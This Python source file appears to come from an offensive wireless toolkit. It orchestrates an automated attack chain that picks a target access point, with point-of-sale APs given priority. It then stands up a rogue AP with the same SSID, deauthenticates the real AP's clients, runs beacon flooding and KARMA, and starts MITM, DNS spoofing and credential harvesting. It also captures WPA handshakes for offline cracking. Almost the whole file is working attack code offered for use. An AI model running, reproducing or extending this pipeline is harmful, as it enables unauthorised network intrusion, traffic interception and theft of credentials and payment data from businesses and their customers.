"""
Attack Orchestrator (Stage 2 Enhanced)
──────────────────────────────────────
Automated attack pipeline that uses recon scan results to:
  1. Select the best target (strongest POS AP, or strongest AP overall)
  2. Extract its SSID, channel, and associated clients from the database
  3. Launch rogue AP on the same SSID/channel
  4. Start deauth engine targeting the real AP's clients (with signal filtering)
  5. Flood known beacons + KARMA (respond to all probe requests)
  6. Continue background recon to dynamically feed new clients into deauth
  7. Capture WPA handshakes to PCAP for offline cracking
  8. Test credentials against real AP to verify compromise

No manual target specification required — everything is driven by scan data.
"""

import time
import threading
import os

from scapy.all import sniff, raw, RandMAC
from scapy.layers.dot11 import Dot11, Dot11ProbeReq, Dot11Elt
from scapy.layers.eap import EAPOL

from .config import CHANNELS_24GHZ, WIFI_BROADCAST, log
from .database import POSDatabase
from .recon import ReconEngine
from .deauth import DeauthEngine
from .beacons import KnownBeaconsEngine
from .karma import KARMAEngine
from .rogueap import RogueAPEngine
from .handshake import HandshakeCapture
from .isolation import IsolationDetector
from .signal_targeting import SignalTargeting
from .cred_tester import CredentialTester
from .mitm import MITMEngine, HTTPInjector
from .ssl_strip import SSLStripper
from .dns_spoof import DNSSpoofEngine
from .cred_harvester import CredentialHarvester
from .network_disruption import NetworkDisruption, DeauthStorm
from .post_attack import PostAttackAnalyzer


class AttackOrchestrator:
    """
    Fully automated attack pipeline driven by recon scan data.

    Flow:
        1. Run ReconEngine for configured duration (populates DB)
        2. Query DB for best target AP (POS priority, then strongest signal)
        3. Pull all known clients of that AP from DB
        4. Launch RogueAP with scanned SSID + channel
        5. Start DeauthEngine targeting scanned clients
        6. Start KnownBeacons with probed SSIDs from scanned clients
        7. Background recon continues feeding new clients into deauth
    """

    def __init__(self, monitor_iface, ap_iface, db=None, channels=None,
                 target_bssid=None, target_ssid=None, target_channel=None,
                 recon_duration=30, enable_beacons=True,
                 enable_karma=True, test_credentials=False,
                 enable_isolation_check=True, signal_rssi_limit=-80):
        self.monitor_iface = monitor_iface
        self.ap_iface = ap_iface
        self.channels = channels or CHANNELS_24GHZ
        self.target_bssid = target_bssid
        self.target_ssid = target_ssid
        self.target_channel = target_channel
        self.recon_duration = recon_duration
        self.enable_beacons = enable_beacons
        self.enable_karma = enable_karma
        self.test_credentials = test_credentials
        self.enable_isolation_check = enable_isolation_check
        self.signal_rssi_limit = signal_rssi_limit

        self.db = db or POSDatabase()
        self.recon = ReconEngine(monitor_iface, self.db, channels=self.channels)
        self.deauth = DeauthEngine(monitor_iface)
        self.rogue_ap = None
        self.beacons = None
        self.karma = None
        self.handshakes = HandshakeCapture()
        self.signal_filter = SignalTargeting(rssi_threshold=signal_rssi_limit)
        self.cred_tester = CredentialTester(monitor_iface) if test_credentials else None
        self.isolation_detector = None

        # New attack modules
        self.mitm_engine = None
        self.ssl_stripper = None
        self.dns_spoof = None
        self.cred_harvester = None
        self.network_disruption = None

        self.running = False

    def _auto_select_target(self):
        """Select target from recon data. POS APs get priority."""
        if self.target_bssid and self.target_ssid and self.target_channel:
            return True

        # Try POS AP first
        row = self.db.get_strongest_pos_ap()
        if not row:
            row = self.db.get_strongest_ap()
        if not row:
            log.error("No targets found in recon data")
            return False

        self.target_bssid = row[0]
        self.target_ssid = row[1] or "FreeWiFi"
        self.target_channel = row[2] or 6
        vendor = row[3] if len(row) > 3 else "Unknown"
        rssi = row[4] if len(row) > 4 else -100

        log.info(f"Auto-selected target: '{self.target_ssid}' ({self.target_bssid}) "
                 f"ch {self.target_channel} | {vendor} | {rssi}dBm")
        return True

    def start(self):
        """Execute the full automated attack chain."""
        self.running = True
        self._attack_start_time = time.time()
        log.info(f"Attack chain initiated at {time.strftime('%Y-%m-%d %H:%M:%S')}")

        # ── Phase 1: Passive Recon ────────────────────────────────────────────
        log.info(f"Phase 1: Passive recon ({self.recon_duration}s)...")
        self.recon.set_signal_targeting(self.signal_filter)
        self.recon.start(timeout=self.recon_duration)
        self.recon.stop()

        stats = self.db.get_stats()
        log.info(f"Recon complete: {stats['access_points']} APs, "
                 f"{stats['clients']} clients, "
                 f"{stats['pos_access_points']} POS APs found")

        # ── Phase 2: Target Selection (from scan data) ────────────────────────
        if not self._auto_select_target():
            self.running = False
            return False

        # ── Phase 2b: Check for client isolation ──────────────────────────────
        if self.enable_isolation_check:
            self.isolation_detector = IsolationDetector(
                self.monitor_iface, self.target_bssid, self.db)
            if self.isolation_detector.detect(timeout=30):
                log.warning("AP isolation detected - attack may be less effective")
                log.warning("Clients may not be able to reach our rogue AP")

        # Get all clients of target AP from scan data (now returns (mac, rssi) tuples)
        all_clients_data = self.db.get_clients_for_bssid(self.target_bssid)
        all_clients = set()

        # Filter by signal strength using RSSI data from database
        close_clients = set()
        for client_mac, rssi in all_clients_data:
            all_clients.add(client_mac)
            if self.signal_filter.should_deauth(client_mac):
                close_clients.add(client_mac)
            elif rssi is not None and self.signal_filter.should_deauth_with_rssi(client_mac, rssi):
                close_clients.add(client_mac)

        log.info(f"Target has {len(all_clients)} total clients, "
                 f"{len(close_clients)} within signal range (RSSI > {self.signal_rssi_limit}dBm)")

        # ── Phase 3: Rogue AP (uses scanned SSID + channel) ──────────────────
        rogue_mac = str(RandMAC())
        self.rogue_ap = RogueAPEngine(
            interface=self.ap_iface,
            ssid=self.target_ssid,
            channel=self.target_channel,
            db=self.db,
            mac_address=rogue_mac,
        )
        if not self.rogue_ap.start():
            log.error("Failed to start rogue AP")
            self.running = False
            return False

        # ── Phase 4: Deauth (targets scanned clients with signal filtering) ───
        self.deauth.add_target(self.target_bssid, close_clients)
        self.deauth.start()

        # ── Phase 5: Beacon Flood (uses probed SSIDs from scan) ──────────────
        if self.enable_beacons:
            self.beacons = KnownBeaconsEngine(self.monitor_iface, rogue_mac)
            self.beacons.add_probed_ssids_from_db(self.db)
            self.beacons.start()

        # ── Phase 5b: KARMA attack (respond to all probes) ───────────────────
        if self.enable_karma:
            self.karma = KARMAEngine(self.monitor_iface, rogue_mac)
            self.karma.start()
            log.info("KARMA attack enabled - will respond to all probe requests")

        # ── Phase 5c: Start new attack modules ────────────────────────────────
        # Start MITM for traffic interception
        if close_clients:
            self.mitm_engine = MITMEngine(self.monitor_iface)
            # MITM on the first close client as example
            sample_client = list(close_clients)[0] if close_clients else None
            if sample_client:
                self.mitm_engine.start(target_ip=sample_client)
                log.info(f"MITM attack started against {sample_client}")

        # Start DNS spoofing for all targets
        self.dns_spoof = DNSSpoofEngine(self.monitor_iface)
        self.dns_spoof.add_common_targets()
        self.dns_spoof.start()
        log.info("DNS spoofing enabled")

        # Start credential harvester
        self.cred_harvester = CredentialHarvester(self.monitor_iface, self.db)
        threading.Thread(target=self.cred_harvester.start, daemon=True).start()
        log.info("Credential harvester started")

        # ── Phase 6: Background Recon (feeds new clients into deauth) ────────
        self.recon.running = True
        threading.Thread(target=self._background_recon, daemon=True).start()

        log.info("=" * 60)
        log.info("AUTOMATED ATTACK ACTIVE (Stage 2)")
        log.info(f"  Target:  {self.target_bssid} ('{self.target_ssid}') ch {self.target_channel}")
        log.info(f"  Rogue:   {self.ap_iface} ({rogue_mac})")
        log.info(f"  Deauth:  {len(close_clients)} clients within range + broadcast")
        log.info(f"  Beacons: {'Active' if self.enable_beacons else 'Disabled'}")
        log.info(f"  KARMA:   {'Active' if self.enable_karma else 'Disabled'}")
        log.info(f"  Portal:  http://{self.rogue_ap.mac_address and '10.0.0.1'}:80")
        log.info("=" * 60)
        return True

    def _background_recon(self):
        """Continue sniffing to discover new clients and auto-add to deauth."""
        def handler(pkt):
            self.recon.packet_handler(pkt)
            # Capture EAPOL handshakes
            if pkt.haslayer(EAPOL):
                eapol_layer = pkt.getlayer(EAPOL)
                eapol_raw = raw(eapol_layer)
                msg_num = self.recon._identify_eapol_message(eapol_raw)
                if msg_num:
                    # Get client/mac from packet
                    ds_flags = pkt.FCfield & 0x3
                    if ds_flags == 0x1:
                        client_mac, bssid = pkt.addr2, pkt.addr1
                    elif ds_flags == 0x2:
                        client_mac, bssid = pkt.addr1, pkt.addr2
                    else:
                        client_mac, bssid = pkt.addr2, (pkt.addr3 or pkt.addr1)
                    if client_mac and bssid:
                        self.handshakes.add_frame(client_mac, bssid, pkt, msg_num)
                        # Check for complete handshake
                        if self.handshakes.is_complete(client_mac, bssid):
                            pcap_file = self.handshakes.export_pcap(client_mac, bssid)
                            if pcap_file and self.test_credentials:
                                log.info(f"Handshake saved to {pcap_file} - ready for hashcat")

            # Dynamically add newly seen clients of the target AP
            if pkt.haslayer(Dot11) and pkt.type == 2:
                client = pkt.addr2
                bssid = pkt.addr3
                if (bssid == self.target_bssid and client
                        and client != bssid and client != WIFI_BROADCAST):
                    # Signal filtering for new clients
                    if self.signal_filter.should_deauth(client):
                        if client not in self.deauth._targets.get(self.target_bssid, set()):
                            self.deauth._targets[self.target_bssid].add(client)
                            log.info(f"New client auto-targeted: {client}")

            # KARMA: respond to all probe requests
            if self.enable_karma and pkt.haslayer(Dot11ProbeReq):
                ssid_elt = pkt.getlayer(Dot11Elt)
                ssid = ""
                if ssid_elt and ssid_elt.ID == 0 and ssid_elt.info:
                    ssid = ssid_elt.info.decode(errors='ignore')
                client_mac = pkt.addr2
                if client_mac and self.karma:
                    self.karma.on_probe_request(client_mac, ssid)

        try:
            from scapy.all import raw
            sniff(iface=self.monitor_iface, prn=handler, store=0,
                  stop_filter=lambda x: not self.running)
        except Exception:
            pass

    def stop(self):
        """Shut down all attack components gracefully."""
        self.running = False

        if hasattr(self, '_attack_start_time'):
            duration = time.time() - self._attack_start_time
            log.info(f"Attack duration: {duration:.1f} seconds")
        
        # Stop all engines
        engines = [
            self.recon, self.deauth, self.beacons, self.karma, 
            self.rogue_ap, self.mitm_engine, self.ssl_stripper,
            self.dns_spoof, self.cred_harvester, self.network_disruption
        ]
        
        for engine in engines:
            if engine:
                try:
                    engine.stop()
                except Exception as e:
                    log.error(f"Error stopping {engine.__class__.__name__}: {e}")
        
        # Wait for background threads (timeout after 10s)
        import threading
        for thread in threading.enumerate():
            if thread != threading.current_thread():
                thread.join(timeout=1)
        
        # Now safe to close database
        if self.db:
            self.db.close()
        
        # Export any remaining handshakes
        remaining = self.handshakes.export_all()
        if remaining:
            log.info(f"Exported {len(remaining)} additional handshakes")
        
        self.recon._print_status()
        
        # Run post-attack analysis
        self._run_post_attack_analysis()
        
        log.info("Attack terminated. All data saved.")

    def _run_post_attack_analysis(self):
        """Generate post-attack analysis and next steps."""
        log.info("=" * 60)
        log.info("POST-ATTACK ANALYSIS")
        log.info("=" * 60)

        analyzer = PostAttackAnalyzer(self.db)

        # Print summary to console
        analyzer.print_summary()

        # Export credentials
        credentials = analyzer.export_credentials()

        # Export handshakes
        analyzer.export_handshakes()

        # Generate full report
        report = analyzer.generate_report("exports/attack_report.json")

        # Print next steps
        log.info("\nNEXT STEPS:")
        for i, step in enumerate(analyzer.get_next_steps(priority_filter="HIGH"), 1):
            log.info(f"  {i}. {step}")

        log.info("=" * 60)
